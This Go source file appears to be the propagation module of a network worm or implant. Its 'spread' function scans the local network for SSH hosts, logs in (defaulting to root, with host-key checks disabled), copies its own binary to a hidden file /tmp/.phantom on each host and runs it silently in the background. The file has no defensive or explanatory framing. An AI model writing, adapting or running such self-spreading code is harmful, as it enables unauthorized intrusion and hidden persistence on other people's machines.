package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func hasCmd(name string) bool {
	_, err := exec.LookPath(name)
	return err == nil
}

func sshRun(host, user, pass, remote string) error {
	if pass != "" && hasCmd("sshpass") {
		return newCmd("sshpass", "-p", pass, "ssh",
			"-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
			user+"@"+host, remote).Run()
	}
	return newCmd("ssh",
		"-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
		user+"@"+host, remote).Run()
}

func sshCopy(host, user, pass, src, dst string) error {
	if pass != "" && hasCmd("sshpass") {
		return newCmd("sshpass", "-p", pass, "scp",
			"-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
			src, user+"@"+host+":"+dst).Run()
	}
	return newCmd("scp",
		"-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
		src, user+"@"+host+":"+dst).Run()
}

func spread(targets, user, pass string) Result {
	exe, err := os.Executable()
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	if user == "" {
		user = "root"
	}

	var hosts []string
	for _, t := range strings.Split(targets, ",") {
		if t = strings.TrimSpace(t); t != "" {
			hosts = append(hosts, t)
		}
	}
	if len(hosts) == 0 {
		res := scanNet("", "22")
		var hits []scanHit
		json.Unmarshal([]byte(res.Out), &hits)
		for _, h := range hits {
			hosts = append(hosts, h.IP)
		}
	}

	var log strings.Builder
	if !hasCmd("sshpass") && pass != "" {
		log.WriteString("[!] sshpass not found — falling back to key auth (set up ssh keys or install sshpass)\n")
	}
	for _, h := range hosts {
		if err := sshCopy(h, user, pass, exe, "/tmp/.phantom"); err != nil {
			log.WriteString(fmt.Sprintf("[x] %s scp: %v\n", h, err))
			continue
		}
		if err := sshRun(h, user, pass,
			"chmod +x /tmp/.phantom; nohup /tmp/.phantom >/dev/null 2>&1 &"); err != nil {
			log.WriteString(fmt.Sprintf("[x] %s run: %v\n", h, err))
			continue
		}
		log.WriteString(fmt.Sprintf("[+] deployed -> %s\n", h))
	}
	return Result{OK: true, Out: log.String()}
}